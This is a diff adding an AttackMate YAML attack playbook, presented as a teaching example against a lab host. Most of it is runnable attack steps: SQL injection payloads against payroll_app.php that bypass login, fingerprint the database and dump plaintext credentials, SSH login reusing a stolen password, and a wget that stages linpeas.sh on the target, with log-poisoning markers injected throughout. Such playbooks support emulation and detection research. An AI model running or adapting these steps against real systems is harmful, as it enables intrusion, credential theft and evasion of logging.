@@ -1,0 +1,203 @@
+#
+# Author: AttackMate Initial-Access experiment (MIRANDA teaching example)
+# Description:
+#     Payroll SQLi -> reuse the stolen creds -> stage a privesc-enum tool. The three
+#     payroll_app.php injections dump plaintext credentials that match the system SSH
+#     logins; we SSH in as one of those users (artoo_detoo) and wget linpeas.sh onto the
+#     target. We STOP at staging -- the script is downloaded but never made executable
+#     and never run.
+#
+#     Tactic flow: Credential Access (SQLi) -> Initial Access -> Command and Control (tool staging)
+#     (Defense Evasion runs throughout: the log-injection marker rides every step.)
+#
+# AUTHORIZED USE ONLY:
+#     Run this only against systems you own or have explicit written permission to test.
+#
+vars:
+  TARGET: 172.28.128.3
+  PAYROLL_URL: http://172.28.128.3/payroll_app.php
+  # Credential surfaced by the payroll dump (injection #3). Swap for any dumped SW user;
+  # artoo_detoo is a non-sudo account, so staging a privesc-enum tool is the coherent next move.
+  SW_USER: artoo_detoo
+  SW_PASS: b00p_b33p
+  LINPEAS_URL: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+  # Log-injection marker. Space-free single token: greppable as one field across the
+  # access.log / auth.log / auditd / MySQL general_log layers.
+  INJECTION: "this_is_the_injection"
+
+commands:
+
+  # ===================== Phase A: operator-side prep =====================
+  - type: shell
+    cmd: "mkdir -p /tmp/payroll_linpeas"
+    metadata:
+      description: "Stage a local directory on the operator host to collect proof/output"
+
+  # ===================== Phase 0: pre-exploit log poisoning =====================
+  - type: http-client
+    cmd: GET
+    url: http://$TARGET/?probe=1
+    useragent: "$INJECTION"
+    exit_on_error: False
+    metadata:
+      description: "Benign-looking GET whose User-Agent seeds the marker into the Apache access log"
+      techniques: "T1562.006"
+      tactics: "Defense Evasion"
+
+  - type: sleep
+    seconds: 4
+    min_sec: 1
+    random: True
+    metadata:
+      description: "Human-paced jitter between the two probes"
+
+  - type: ssh
+    cmd: id
+    username: "$INJECTION"
+    password: "x"
+    hostname: $TARGET
+    interactive: False
+    exit_on_error: False
+    metadata:
+      description: "Bogus SSH username injection -> poisons auth.log (Invalid user ...)"
+      techniques: "T1110.001,T1562.006"
+      tactics: "Credential Access,Defense Evasion"
+
+  # ===================== Phase 1: Credential Access (payroll SQLi) =====================
+
+  # ---- Injection 1: auth bypass -> employee table (Username, First Name, Last Name, Salary)
+  - type: http-client
+    cmd: POST
+    url: $PAYROLL_URL
+    useragent: "$INJECTION"
+    data:
+      user: "' OR 1=1#$INJECTION"
+      password: "x"
+      s: "Login"
+    save: /tmp/payroll_linpeas/payroll_employees.html
+    metadata:
+      description: "SQLi auth-bypass; dumps the employee table; User-Agent poisons the Apache access log"
+      techniques: "T1190,T1562.006"
+      tactics: "Initial Access,Defense Evasion"
+
+  - type: debug
+    cmd: "[payroll_linpeas] employee table (4 cols: user/first/last/salary) -> $RESULT_STDOUT"
+    metadata:
+      description: "Print the employee rows (data returned = successful injection)"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 6
+    random: True
+    metadata:
+      description: "Operator-side think time before the next injection (human pacing)"
+
+  # ---- Injection 2: DBMS version fingerprint (4-col UNION; @@version shows in the Salary column)
+  - type: http-client
+    cmd: POST
+    url: $PAYROLL_URL
+    useragent: "$INJECTION"
+    data:
+      user: "' UNION SELECT null, null, null,@@version#$INJECTION"
+      password: "x"
+      s: "Login"
+    save: /tmp/payroll_linpeas/payroll_version.html
+    metadata:
+      description: "UNION-based DBMS version fingerprint (@@version); User-Agent poisons the access log"
+      techniques: "T1190,T1082,T1562.006"
+      tactics: "Initial Access,Discovery,Defense Evasion"
+
+  - type: debug
+    cmd: "[payroll_linpeas] MySQL version (read the Salary column) -> $RESULT_STDOUT"
+    metadata:
+      description: "Print the version row (expect 5.5.60-0ubuntu0.14.04.1)"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 6
+    random: True
+    metadata:
+      description: "Operator-side think time before the credential dump (human pacing)"
+
+  # ---- Injection 3: credential dump from `users` (username -> Last Name col, password -> Salary col)
+  # This is the step that "steals the creds" -- the plaintext pairs match the system SSH logins.
+  - type: http-client
+    cmd: POST
+    url: $PAYROLL_URL
+    useragent: "$INJECTION"
+    data:
+      user: "' OR 1=1 UNION SELECT null,null,username,password FROM users#$INJECTION"
+      password: "x"
+      s: "Login"
+    save: /tmp/payroll_linpeas/payroll_creds.html
+    metadata:
+      description: "UNION-based credential dump from the users table; User-Agent poisons the access log"
+      techniques: "T1190,T1212,T1562.006"
+      tactics: "Initial Access,Credential Access,Defense Evasion"
+
+  - type: debug
+    cmd: "[payroll_linpeas] dumped username/password pairs (match the SSH logins) -> $RESULT_STDOUT"
+    metadata:
+      description: "Print the credential rows (plaintext user/pass = SSH creds; $SW_USER used below)"
+
+  - type: sleep
+    min_sec: 3
+    seconds: 8
+    random: True
+    metadata:
+      description: "Operator-side think time to read the dumped creds and pick an account (human pacing)"
+
+  # ===================== Phase 2: Initial Access (reuse the stolen SSH creds) =====================
+  # Log in with a credential lifted from the payroll dump (T1078 Valid Accounts). The proof `id`
+  # is wrapped so its execve also carries the marker.
+  - type: ssh
+    cmd: "bash -c 'id' \"$INJECTION\""
+    username: $SW_USER
+    password: $SW_PASS
+    hostname: $TARGET
+    interactive: False
+    creates_session: "foothold"
+    metadata:
+      description: "SSH in as the Star Wars user whose creds the payroll dump leaked; execve poisoned with the marker"
+      techniques: "T1078,T1021.004,T1033,T1562.006"
+      tactics: "Initial Access,Lateral Movement,Discovery,Defense Evasion"
+
+  - type: sleep
+    min_sec: 2
+    seconds: 6
+    random: True
+    metadata:
+      description: "Operator-side think time before staging tooling (human pacing)"
+
+  # ===================== Phase 3: Tool staging (linpeas), NO EXECUTION =====================
+  # Download the privesc-enum script onto the target (Ingress Tool Transfer). We deliberately
+  # DO NOT chmod +x it and DO NOT run it -- the trace ends at staging. --no-check-certificate
+  # tolerates the old 14.04 TLS stack; the wget execve is the artifact regardless of completion.
+  - type: ssh
+    cmd: "bash -c 'wget -q --no-check-certificate -O /tmp/linpeas.sh $LINPEAS_URL' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    metadata:
+      description: "wget linpeas onto the target (staged, not executed); execve poisoned with the marker"
+      techniques: "T1105,T1562.006"
+      tactics: "Command and Control,Defense Evasion"
+
+  # Confirm the file landed (size/perms). Note: no execute bit set -- staged only.
+  - type: ssh
+    cmd: "bash -c 'ls -l /tmp/linpeas.sh' \"$INJECTION\""
+    session: "foothold"
+    interactive: False
+    exit_on_error: False
+    save: /tmp/payroll_linpeas/linpeas_staged.txt
+    metadata:
+      description: "Confirm linpeas.sh is staged on the target; execve poisoned with the marker"
+      techniques: "T1083,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: debug
+    cmd: "[payroll_linpeas] complete -> stolen creds ($SW_USER) reused for SSH; linpeas STAGED at /tmp/linpeas.sh, NOT executed -> $RESULT_STDOUT"
+    metadata:
+      description: "Summary: payroll -> stolen-cred SSH -> linpeas staged (no execution)"
+      techniques: "T1105"
+      tactics: "Command and Control"
